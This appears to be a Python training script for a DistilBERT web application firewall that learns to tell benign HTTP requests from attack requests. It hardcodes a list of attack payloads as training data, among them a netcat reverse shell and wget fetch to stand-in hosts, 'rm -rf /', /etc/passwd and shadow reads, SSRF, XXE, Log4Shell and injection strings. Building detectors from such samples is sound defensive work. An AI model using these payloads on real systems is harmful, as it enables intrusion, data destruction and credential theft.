#!/usr/bin/env python3
"""
Train WAF Anomaly Detection Model

Trains a DistilBERT-based binary classifier on:
  - Benign requests from generate_training_data.py (label=0)
  - Malicious requests from PayloadsAllTheThings + existing payloads (label=1)

Option D from the Phase 1 plan: semi-supervised approach where benign
data comes from our pipeline and malicious data is synthetic.

Usage:
    python scripts/train_anomaly_model.py
    python scripts/train_anomaly_model.py --data data/training/benign_requests.json --epochs 5
    python scripts/train_anomaly_model.py --output models/waf-anomaly --batch-size 32
"""

import argparse
import json
import logging
import random
import sys
from pathlib import Path
from typing import Optional

import numpy as np
import torch
from torch.utils.data import Dataset, DataLoader
from transformers import (
    AutoTokenizer,
    AutoModelForSequenceClassification,
    TrainingArguments,
    Trainer,
    DataCollatorWithPadding,
)
from sklearn.metrics import (
    accuracy_score,
    precision_recall_fscore_support,
    roc_auc_score,
    confusion_matrix,
)
from sklearn.model_selection import train_test_split

PROJECT_ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Malicious request generation (synthetic attack payloads)
# ---------------------------------------------------------------------------

def load_malicious_payloads() -> list[str]:
    """Load malicious payloads from the project's payload collection."""
    payloads = []

    # Try importing from tests/payloads
    try:
        sys.path.insert(0, str(PROJECT_ROOT / "tests"))
        from payloads.malicious_payloads import (
            SQL_INJECTION_PAYLOADS,
            XSS_PAYLOADS,
        )
        payloads.extend(SQL_INJECTION_PAYLOADS)
        payloads.extend(XSS_PAYLOADS)
    except ImportError:
        logger.warning("Could not load payloads from tests/payloads")

    # Add more built-in payloads for diversity
    payloads.extend([
        # Command injection
        "; cat /etc/passwd",
        "| ls -la",
        "$(whoami)",
        "`id`",
        "; rm -rf /",
        "| nc attacker.com 4444 -e /bin/sh",
        "&& wget http://evil.com/shell.sh",

        # Path traversal
        "../../etc/passwd",
        "../../../etc/shadow",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..\\..\\..\\windows\\system32\\config\\sam",

        # SSRF
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:22",
        "http://0.0.0.0:6379/",
        "gopher://127.0.0.1:6379/_INFO",

        # XXE
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',

        # LDAP injection
        "*)(uid=*))(|(uid=*",
        "admin)(&)",

        # Header injection
        "evil.com\r\nX-Injected: true",
        "\r\nSet-Cookie: session=hijacked",

        # NoSQL injection
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "sleep(5000)"}',

        # Log4Shell style
        "${jndi:ldap://evil.com/a}",
        "${jndi:rmi://evil.com/exploit}",

        # Template injection
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
    ])

    return payloads


def generate_malicious_requests(
    payloads: list[str],
    count: int = 5000,
) -> list[dict]:
    """Generate malicious request texts from payloads.

    Creates realistic-looking HTTP requests with attack payloads
    injected in various positions (path, query params, body, headers).
    """
    results = []
    methods = ["GET", "POST", "PUT", "DELETE"]
    paths = [
        "/api/users", "/api/products", "/api/search", "/api/login",
        "/api/orders", "/api/admin", "/api/upload", "/api/config",
        "/rest/user/login", "/WebGoat/login", "/dvwa/vulnerabilities/sqli/",
    ]

    for i in range(count):
        payload = random.choice(payloads)
        method = random.choice(methods)
        base_path = random.choice(paths)
        injection_point = random.choice(["query", "path", "body", "header"])

        if injection_point == "query":
            param_name = random.choice(["id", "q", "search", "name", "input", "page", "file"])
            text = f"{method} {base_path}?{param_name}={payload} HTTP/1.1\nUser-Agent: Mozilla/5.0"

        elif injection_point == "path":
            text = f"{method} {base_path}/{payload} HTTP/1.1\nUser-Agent: Mozilla/5.0"

        elif injection_point == "body":
            text = (
                f"POST {base_path} HTTP/1.1\n"
                f"Content-Type: application/x-www-form-urlencoded\n"
                f"User-Agent: Mozilla/5.0\n\n"
                f"input={payload}"
            )

        else:  # header
            text = (
                f"{method} {base_path} HTTP/1.1\n"
                f"User-Agent: {payload}\n"
                f"Referer: {payload}"
            )

        results.append({
            "text": text,
            "label": 1,  # malicious
        })

    logger.info("Generated %d malicious training samples", len(results))
    return results


# ---------------------------------------------------------------------------
# Dataset
# ---------------------------------------------------------------------------

class WAFDataset(Dataset):
    """PyTorch dataset for WAF training."""

    def __init__(self, texts: list[str], labels: list[int], tokenizer, max_length: int = 512):
        self.encodings = tokenizer(
            texts,
            truncation=True,
            max_length=max_length,
            padding=False,
        )
        self.labels = labels

    def __len__(self):
        return len(self.labels)

    def __getitem__(self, idx):
        item = {key: torch.tensor(val[idx]) for key, val in self.encodings.items()}
        item["labels"] = torch.tensor(self.labels[idx])
        return item


# ---------------------------------------------------------------------------
# Metrics
# ---------------------------------------------------------------------------

def compute_metrics(eval_pred):
    """Compute evaluation metrics."""
    logits, labels = eval_pred
    predictions = np.argmax(logits, axis=-1)
    probabilities = torch.softmax(torch.tensor(logits), dim=-1)[:, 1].numpy()

    precision, recall, f1, _ = precision_recall_fscore_support(
        labels, predictions, average="binary",
    )
    acc = accuracy_score(labels, predictions)

    try:
        auc = roc_auc_score(labels, probabilities)
    except ValueError:
        auc = 0.0

    # Compute FPR and TPR
    tn, fp, fn, tp = confusion_matrix(labels, predictions, labels=[0, 1]).ravel()
    fpr = fp / (fp + tn) if (fp + tn) > 0 else 0.0
    tpr = tp / (tp + fn) if (tp + fn) > 0 else 0.0

    return {
        "accuracy": acc,
        "f1": f1,
        "precision": precision,
        "recall": recall,
        "roc_auc": auc,
        "fpr": fpr,
        "tpr": tpr,
    }


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def parse_args():
    parser = argparse.ArgumentParser(description="Train WAF anomaly model")
    parser.add_argument(
        "--data", default="data/training/benign_requests.json",
        help="Path to benign training data JSON",
    )
    parser.add_argument(
        "--model-name", default="distilbert-base-uncased",
        help="Base model name (default: distilbert-base-uncased)",
    )
    parser.add_argument(
        "--output", default="models/waf-anomaly",
        help="Output directory for trained model",
    )
    parser.add_argument("--epochs", type=int, default=5, help="Training epochs")
    parser.add_argument("--batch-size", type=int, default=32, help="Batch size")
    parser.add_argument("--lr", type=float, default=2e-5, help="Learning rate")
    parser.add_argument("--max-length", type=int, default=512, help="Max token length")
    parser.add_argument(
        "--malicious-ratio", type=float, default=0.3,
        help="Ratio of malicious samples to total (default: 0.3)",
    )
    parser.add_argument(
        "--max-benign", type=int, default=None,
        help="Max benign samples to use (None = all)",
    )
    parser.add_argument("--seed", type=int, default=42, help="Random seed")
    return parser.parse_args()


def main():
    args = parse_args()
    random.seed(args.seed)
    np.random.seed(args.seed)
    torch.manual_seed(args.seed)

    data_path = PROJECT_ROOT / args.data
    output_dir = PROJECT_ROOT / args.output

    # -----------------------------------------------------------------------
    # 1. Load benign data
    # -----------------------------------------------------------------------
    if not data_path.exists():
        logger.error(
            "Benign data not found at %s. Run generate_training_data.py first.", data_path
        )
        sys.exit(1)

    with open(data_path) as f:
        benign_raw = json.load(f)

    benign_texts = [item["text"] for item in benign_raw]
    if args.max_benign:
        benign_texts = benign_texts[:args.max_benign]

    logger.info("Loaded %d benign samples from %s", len(benign_texts), data_path)

    # -----------------------------------------------------------------------
    # 2. Generate malicious data
    # -----------------------------------------------------------------------
    payloads = load_malicious_payloads()
    n_malicious = int(len(benign_texts) * args.malicious_ratio / (1 - args.malicious_ratio))
    malicious_data = generate_malicious_requests(payloads, n_malicious)
    malicious_texts = [item["text"] for item in malicious_data]

    logger.info(
        "Dataset: %d benign + %d malicious = %d total",
        len(benign_texts), len(malicious_texts),
        len(benign_texts) + len(malicious_texts),
    )

    # -----------------------------------------------------------------------
    # 3. Combine and split
    # -----------------------------------------------------------------------
    all_texts = benign_texts + malicious_texts
    all_labels = [0] * len(benign_texts) + [1] * len(malicious_texts)

    train_texts, val_texts, train_labels, val_labels = train_test_split(
        all_texts, all_labels,
        test_size=0.15,
        random_state=args.seed,
        stratify=all_labels,
    )

    logger.info("Train: %d, Validation: %d", len(train_texts), len(val_texts))

    # -----------------------------------------------------------------------
    # 4. Tokenize
    # -----------------------------------------------------------------------
    logger.info("Loading tokenizer: %s", args.model_name)
    tokenizer = AutoTokenizer.from_pretrained(args.model_name)

    logger.info("Tokenizing datasets...")
    train_dataset = WAFDataset(train_texts, train_labels, tokenizer, args.max_length)
    val_dataset = WAFDataset(val_texts, val_labels, tokenizer, args.max_length)

    # -----------------------------------------------------------------------
    # 5. Load model
    # -----------------------------------------------------------------------
    logger.info("Loading model: %s", args.model_name)
    model = AutoModelForSequenceClassification.from_pretrained(
        args.model_name,
        num_labels=2,
        id2label={0: "benign", 1: "malicious"},
        label2id={"benign": 0, "malicious": 1},
    )

    device = "cuda" if torch.cuda.is_available() else "cpu"
    logger.info("Using device: %s", device)

    # -----------------------------------------------------------------------
    # 6. Train
    # -----------------------------------------------------------------------
    data_collator = DataCollatorWithPadding(tokenizer=tokenizer)

    training_args = TrainingArguments(
        output_dir=str(output_dir),
        eval_strategy="epoch",
        save_strategy="epoch",
        learning_rate=args.lr,
        per_device_train_batch_size=args.batch_size,
        per_device_eval_batch_size=args.batch_size,
        num_train_epochs=args.epochs,
        weight_decay=0.01,
        load_best_model_at_end=True,
        metric_for_best_model="f1",
        greater_is_better=True,
        logging_steps=50,
        warmup_ratio=0.1,
        fp16=torch.cuda.is_available(),
        report_to="none",
        seed=args.seed,
    )

    trainer = Trainer(
        model=model,
        args=training_args,
        train_dataset=train_dataset,
        eval_dataset=val_dataset,
        tokenizer=tokenizer,
        data_collator=data_collator,
        compute_metrics=compute_metrics,
    )

    logger.info("Starting training for %d epochs...", args.epochs)
    trainer.train()

    # -----------------------------------------------------------------------
    # 7. Evaluate
    # -----------------------------------------------------------------------
    logger.info("Final evaluation:")
    metrics = trainer.evaluate()

    print("\n=== Training Results ===")
    for key, value in sorted(metrics.items()):
        if isinstance(value, float):
            print(f"  {key}: {value:.4f}")
        else:
            print(f"  {key}: {value}")

    # Check acceptance criteria
    tpr = metrics.get("eval_tpr", 0)
    fpr = metrics.get("eval_fpr", 1)
    f1 = metrics.get("eval_f1", 0)

    print(f"\n=== Phase 1 Acceptance Criteria ===")
    print(f"  Detection rate (TPR): {tpr:.2%} {'PASS' if tpr > 0.80 else 'FAIL'} (target: >80%)")
    print(f"  False positive rate:  {fpr:.2%} {'PASS' if fpr < 0.05 else 'FAIL'} (target: <5%)")
    print(f"  F1 score:             {f1:.4f}")

    # -----------------------------------------------------------------------
    # 8. Save
    # -----------------------------------------------------------------------
    logger.info("Saving model to %s", output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    trainer.save_model(str(output_dir))
    tokenizer.save_pretrained(str(output_dir))

    # Save training metadata
    metadata = {
        "base_model": args.model_name,
        "epochs": args.epochs,
        "batch_size": args.batch_size,
        "learning_rate": args.lr,
        "max_length": args.max_length,
        "benign_samples": len(benign_texts),
        "malicious_samples": len(malicious_texts),
        "train_samples": len(train_texts),
        "val_samples": len(val_texts),
        "metrics": {k: float(v) if isinstance(v, (float, np.floating)) else v for k, v in metrics.items()},
    }
    with open(output_dir / "training_metadata.json", "w") as f:
        json.dump(metadata, f, indent=2)

    print(f"\nModel saved to: {output_dir}")
    print(f"Metadata saved to: {output_dir / 'training_metadata.json'}")


if __name__ == "__main__":
    main()
